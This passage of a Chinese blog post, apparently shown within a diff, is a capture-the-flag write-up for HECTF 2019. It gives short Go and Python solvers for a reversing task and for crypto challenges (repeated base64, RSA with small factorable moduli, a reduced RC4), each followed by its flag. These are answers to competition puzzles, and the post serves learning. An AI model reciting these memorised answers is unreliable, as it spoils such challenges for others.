&amp;&amp; temp &lt; <span class="number">48</span> &#123;</span><br><span class="line">			temp += <span class="number">8</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> temp &gt;= <span class="number">62</span> &amp;&amp; temp &lt;= <span class="number">73</span> &#123;</span><br><span class="line">			temp += <span class="number">3</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> temp &gt;= <span class="number">79</span> &amp;&amp; temp &lt; <span class="number">92</span> &#123;</span><br><span class="line">			temp -= <span class="number">2</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> temp &gt;= <span class="number">93</span> &amp;&amp; temp &lt;= <span class="number">107</span> &#123;</span><br><span class="line">			temp += <span class="number">4</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> temp &gt;= <span class="number">115</span> &amp;&amp; temp &lt;= <span class="number">125</span> &#123;</span><br><span class="line">			temp -= <span class="number">3</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> temp &lt; <span class="number">38</span> &amp;&amp; temp &gt; <span class="number">29</span> &#123;</span><br><span class="line">			temp += <span class="number">1</span></span><br><span class="line">		&#125;</span><br><span class="line">		src[i] = temp</span><br><span class="line">	&#125;</span><br><span class="line">	src[<span class="number">8</span>] = <span class="string">'Z'</span></span><br><span class="line">	data, _ := base64.StdEncoding.DecodeString(<span class="keyword">string</span>(src))</span><br><span class="line">	fmt.Println(<span class="keyword">string</span>(data)) <span class="comment">// you_@re_n0_prob1am</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><p>这个很简答，一直解码就行了，这里给出 golang 的脚本</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"encoding/base64"</span></span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	<span class="string">"io/ioutil"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	data, err := ioutil.ReadFile(<span class="string">"./base64/flag.txt"</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> <span class="keyword">string</span>(data[:<span class="number">4</span>]) != <span class="string">"flag"</span> &#123;</span><br><span class="line">		data, err = base64.StdEncoding.DecodeString(<span class="keyword">string</span>(data))</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="built_in">panic</span>(err)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="keyword">string</span>(data)) <span class="comment">// flag&#123;c03781ba-81e9-48a6-afa4-037ee7</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="scp-log"><a href="#scp-log" class="headerlink" title="scp_log"></a>scp_log</h3><p>这个是简单的 rsa ，把两个 n 都分解出来就行了，放到在线分解即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse</span><br><span class="line"></span><br><span class="line">n = <span class="number">264875192370170517892762732090900080619</span></span><br><span class="line">c = <span class="number">47819707739737226624777301005156120764</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">14551317285762034343</span></span><br><span class="line">q = <span class="number">18202832579930191133</span></span><br><span class="line"></span><br><span class="line">phi_n = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = inverse(e, phi_n)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(long_to_bytes(m)) <span class="comment"># flag&#123;1721f85a-85</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">106158821499931842590118125106329600437515392507293920805755481915579329343519</span></span><br><span class="line">c = <span class="number">92745720427756739394340901560209310176270205381847603138854431221975461027052</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">320497037861156634156854662131884925503</span></span><br><span class="line">q = <span class="number">331231833555732222509315290877898160673</span></span><br><span class="line"></span><br><span class="line">phi_n = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = inverse(e, phi_n)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(long_to_bytes(m)) <span class="comment"># ed-4769-8faa-4e15baaaa853&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="RC4"><a href="#RC4" class="headerlink" title="RC4?"></a>RC4?</h3><p>RC4 加密，把 256 改成 8，很简单，这里给出 golang 脚本</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	sbox := []<span class="keyword">int</span>&#123;<span class="number">7</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">	mes := []<span class="keyword">byte</span>(<span class="string">"kfggtb&#125;thiu[jtXU@2Xeu&#123;uu|"</span>)</span><br><span class="line"></span><br><span class="line">	i, j := <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> l := <span class="number">0</span>; l &lt; <span class="built_in">len</span>(mes); l++ &#123;</span><br><span class="line">		i = (i + <span class="number">1</span>) % <span class="number">8</span></span><br><span class="line">		j = (j + sbox[i]) % <span class="number">8</span></span><br><span class="line">		temp := sbox[i]</span><br><span class="line">		sbox[i] = sbox[j]</span><br><span class="line">		sbox[j] = temp</span><br><span class="line">		mes[l] ^= <span class="keyword">byte</span>(sbox[(sbox[i]+sbox[j])%<span class="number">8</span>])</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Println(<span class="keyword">string</span>(mes)) <span class="comment">// hebctf&#123;this_is_RC4_crypt&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="注"><a href="#注" class="headerlink" title="注"></a>注</h2><p>还有部分可能忘记了，只可惜在下没有赛后保存题目的习惯，以后注意 (逃</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>0xbz7sb7</span>
+                    </p>
+                
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/WriteUp/"># WriteUp</a>
+                    
+                        <a href="/tags/HECTF/"># HECTF</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2019/10301/">记一次单片机从零到一</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="jinrishici-container">
+        <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+        <span id="poem-sentence">正在加载今日诗词....</span><span id="poem-info"></span>
+        <script type="text/javascript">
+        jinrishici.load(function(result) {
+            // console.log(result)
+            var sentence = document.querySelector("#poem-sentence")
+            var info = document.querySelector("#poem-info")
+            sentence.innerHTML = result.data.content
+            info.innerHTML = " -- " + result.data.origin.author + " 《" + result.data.origin.title + "》"
+        })
+        </script>
+    </div>
+    <div class="copyright">
+        <span>© 2020 0xbz7sb7 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a> | <a href="https://www.jinrishici.com/" target="_blank">今日诗词</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
